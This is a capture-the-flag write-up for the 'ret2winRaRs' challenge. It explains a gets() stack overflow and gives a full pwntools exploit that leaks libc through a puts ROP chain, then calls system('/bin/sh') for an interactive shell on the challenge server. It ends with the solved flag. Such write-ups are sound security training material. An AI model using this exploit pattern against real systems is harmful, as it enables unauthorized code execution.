# ret2winRaRs

## Challenge

A simple challenge that calls `gets`:

```c
void sym.get_license(void)
{
    char *s;

    sym.imp.gets(&s);
    return;
}
```

## Solution

The call to `gets` allows for a buffer overflow, which we can use to overwrite the return address and use a ROP chain.

Earlier, the program uses `puts`, which we can use to leak the address of libc.
Afterwards, we call `main` again so we can send a second payload to spawn a shell.

Using the libc functions, we can call `system("/bin/sh")` to spawn a shell with a second ROP chain.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 193.57.159.27 --port 41299 ret2winrars
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('ret2winrars')
libc = ELF('libc6_2.31-0ubuntu9.2_amd64.so')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '193.57.159.27'
port = int(args.PORT or 41299)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

rop = ROP(exe)

payload = flat({
    0x20+0x8: [
        rop.find_gadget(['pop rdi', 'ret'])[0],
        exe.got['puts'],
        exe.plt['puts'],
        exe.sym['main'],
        ],
    })

io.sendlineafter(": ", payload)
leak = io.recvline()[:-1]

libc.address = u64(leak.ljust(8, b'\x00')) - libc.sym['puts']

io.success(hex(libc.address))

payload = flat({
    0x20+8: [
        rop.find_gadget(['ret'])[0],
        rop.find_gadget(['pop rdi', 'ret'])[0],
        next(libc.search(b'/bin/sh')),
        libc.sym['system'],
        ]
    })

io.sendlineafter(": ", payload)

io.interactive()
```

## Flag

`rarctf{0h_1_g3t5_1t_1t5_l1k3_ret2win_but_w1nr4r5_df67123a66}`

